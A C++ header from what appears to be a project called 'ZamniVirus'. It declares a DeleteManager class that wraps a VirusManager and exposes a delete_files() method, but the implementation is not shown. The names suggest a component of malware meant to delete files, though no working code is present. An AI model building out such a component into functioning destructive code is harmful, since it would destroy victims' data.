#pragma once
#include <ZamniVirus/FileManager/VirusManager.h>


class DeleteManager : Error {
private:
    VirusManager& vm;
public:
    DeleteManager(VirusManager& vm) : vm(vm) {};

    void delete_files();
};
    